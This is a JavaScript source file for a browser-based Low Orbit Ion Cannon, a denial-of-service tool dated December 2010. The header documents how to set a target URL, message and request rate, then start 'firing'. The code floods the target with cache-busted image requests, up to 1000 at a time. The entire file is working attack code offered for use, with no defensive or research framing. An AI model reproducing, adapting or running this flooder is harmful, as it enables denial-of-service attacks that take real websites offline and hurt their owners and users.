/*
 *   Low Orbit Ion Cannon (LOIC)
 *   JavaScript-based version
 *   Lapixx
 *   12 dec 2010
 *
 *   Works in Safari, Chrome, Firefox, Opera and Internet Explorer.
 *
 *   UPDATES
 *   13 dec 2010						MSIE support: it didn't want me to use the reserved 'target' variable.
 *
 *   USAGE:
 *
 *   LOIC.setTarget(url)				Sets the target.
 *   LOIC.setMessage(message)			Sets the message.
 *   LOIC.setRPS(rps) 					Sets the (maximum) number of requests per second.
 *   LOIC.setCapacity(capacity) 		Sets the maximum number of active requests (default: 1000).
 *   LOIC.brief(target, message, rps)	Shortcut to easily set the target, message and RPS.
 *
 *   LOIC.start()						Start firing
 *   LOIC.stop()						Stop firing
 *   LOIC.toggleFire()					Start/stop (toggle) firing. Returns whether LOIC is firing.
 *   LOIC.isFiring()					Returns whether LOIC is firing.
 *
 *   The following functions are used to display some statistics. Once one of the functions is called,
 *   the element with the given elementId will be updated using the innerText method to display the correct
 *   data. Call a function with the argument set to null in order to stop updating the element.
 *
 *   LOIC.displayTotal(elementId)		Display the total number of requests.
 *   LOIC.displayBusy(elementId)		Display the number of active requests.
 *   LOIC.displayCompleted(elementId)	Display the number of completed requests.
 *   LOIC.displayHeat(elementId)		Display the actual number of requests per second.
 *
 *   LOIC.clear()						Clear the stats. Only works when LOIC is not firing.
 *
 *   NOTICE:	Active requests will NOT be canceled when you stop firing or clear the stats.
 *				Therefore the number of active request will NOT be set to 0 when LOIC.clear() is called.
 *
 *   TODO:		LOIC.abort()			Abort all active requests - easy enough - ...or not :/
 */

var LOIC = new function(){

	this.firing = false;
	this.target = "";
	this.capacity = 1000;
	this.rps = 0;
	this.message = "";

	this.heat = 0;
	this.totalReq = 0;
	this.completedReq = 0;
	this.busyReq = 0;

	this.heatDisplay = null;
	this.totalDisplay = null;
	this.completedDisplay = null;
	this.busyDisplay = null;

	this.clear = function(){
		if(!LOIC.firing){
			LOIC.heat = 0;
			LOIC.totalReq = LOIC.totalReq - LOIC.completedReq;
			LOIC.completedReq = 0;

			LOIC.showHeat();
			LOIC.showTotal();
			LOIC.showCompleted();

			return true;
		}
		else{
			return false;
		}
	};

	this.isFiring = function(){
		return LOIC.firing;
	};

	this.toggleFire = function(){
		if(LOIC.firing){
			LOIC.stop();
		}
		else{
			LOIC.start();
		}
		return LOIC.firing;
	};

	this.start = function(){
		if(!LOIC.firing){
			LOIC.interval = window.setInterval(LOIC.aim, (1000 / LOIC.rps | 1));
			LOIC.firing = true;
			return true;
		}
		else{
			return false;
		}
	};

	this.stop = function(){
		if(LOIC.firing){
			window.clearInterval(LOIC.interval);
			LOIC.firing = false;
			return true;
		}
		else{
			return false;
		}
	};

	this.aim = function(){
		LOIC.updateBusy();
		if(LOIC.busyReq < LOIC.capacity){
			var id = Number(new Date());
			var target = LOIC.target + "?" + id;
			if(LOIC.message != ""){
				target = target + "-" + LOIC.message;
			}
			if(LOIC.fire(target)){
				LOIC.heat++;
				LOIC.totalReq++;
				LOIC.showTotal();
				LOIC.updateBusy();
			}
		}
	};

	this.fire = function(url){
		var req = new Image();
		req.onload = LOIC.hit;
		req.onabort = LOIC.hit;
		req.onerror = LOIC.hit;
		req.setAttribute("src",url);

		return true;
	};

	this.hit = function(){
		LOIC.completedReq++;
		LOIC.showCompleted();
		LOIC.updateBusy();
	};

	this.updateHeat = function(){
		LOIC.showHeat();
		LOIC.heat = 0;
	};

	this.updateBusy = function(){
		LOIC.busyReq = LOIC.totalReq - LOIC.completedReq;
		LOIC.showBusy();
	};

	this.showHeat = function(){
		if(LOIC.heatDisplay != null){
			LOIC.heatDisplay.innerHTML = LOIC.heat;
		}
	};
	this.showTotal = function(){
		if(LOIC.totalDisplay != null){
			LOIC.totalDisplay.innerHTML = LOIC.totalReq;
		}
	};
	this.showCompleted = function(){
		if(LOIC.completedDisplay != null){
			LOIC.completedDisplay.innerHTML = LOIC.completedReq;
		}
	};
	this.showBusy = function(){
		if(LOIC.busyDisplay != null){
			LOIC.busyDisplay.innerHTML = LOIC.busyReq;
		}
	};

	this.setTarget = function(target){
		LOIC.target = target;
	};

	this.setMessage = function(message){
		LOIC.message = message;
	};

	this.setRPS = function(rps){
		LOIC.rps = parseInt(rps) | 0;
	};

	this.setCapacity = function(cap){
		LOIC.capacity = parseInt(cap) | 1000;
	};

	this.brief = function(tgt,msg,rps){
		LOIC.setTarget(tgt);
		LOIC.setMessage(msg);
		LOIC.setRPS(rps);
	};

	this.displayHeat = function(element){
		LOIC.heatDisplay = element;
		window.setInterval(LOIC.updateHeat,1000);
	};
	this.displayTotal = function(element){
		LOIC.totalDisplay = element;
	};
	this.displayCompleted = function(element){
		LOIC.completedDisplay = element;
	};
	this.displayBusy = function(element){
		LOIC.busyDisplay = element;
	};

}
